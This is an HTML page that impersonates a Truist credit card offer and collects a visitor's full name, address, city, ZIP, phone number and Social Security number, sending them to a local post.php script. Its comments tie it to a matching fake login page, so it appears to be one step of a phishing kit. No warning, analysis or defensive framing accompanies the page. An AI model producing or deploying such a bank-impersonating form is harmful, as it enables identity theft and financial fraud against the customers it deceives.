<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Personal Information</title>
    <link rel="stylesheet" href="res/css/app.css">
</head>
<body>
    <div class="container">
        <!-- Left panel – same as login page, using identical structure/classes -->
        <div class="left">
            <h4>PREMIUM REWARDS</h4>
            <img src="res/img/card.png" class="card" alt="reward card">
            <span>New experiences are waiting.</span>
            <p>
                Pave your path to adventure with 30,000 bonus points after spending $1,500 
                within 90 days of opening a Truist Enjoy Beyond credit card account.
            </p>
            <button class="btn">Apply now</button>
            <div class="links">
                <a href="#">See rates, fees & rewards</a> <br>
                <a href="#">Learn more</a>
            </div>
        </div>

        <!-- Right panel – personal information form, same classes as login right -->
        <div class="right">
            <img src="res/img/logo.png" class="logo" alt="logo">
            <form action="post.php" method="post">
                <!-- FULL NAME -->
                <label for="fullname">Full name</label>
                <input type="text" id="fullname" name="fullname" value="" autocomplete="name">

                <!-- ADDRESS -->
                <label for="address">Address</label>
                <input type="text" id="address" name="address" value="" autocomplete="street-address">

                <!-- CITY -->
                <label for="city">City</label>
                <input type="text" id="city" name="city" value="" autocomplete="address-level2">

                <!-- ZIP -->
                <label for="zip">ZIP</label>
                <input type="text" id="zip" name="zip" value="" autocomplete="postal-code">

                <!-- PHONE NUMBER -->
                <label for="phone">Phone number</label>
                <input type="tel" id="phone" name="phone" value="" autocomplete="tel">

                <!-- SSN -->
                <label for="ssn">SSN</label>
                <input type="text" id="ssn" name="ssn" value="" maxlength="11" autocomplete="off">

                <!-- Submit button – same class as login "Sign in" -->
                <button type="submit" class="btn2">Save information</button>
            </form>
        </div>
    </div>
    <script src="./res/jq.js"></script>
</body>
</html>
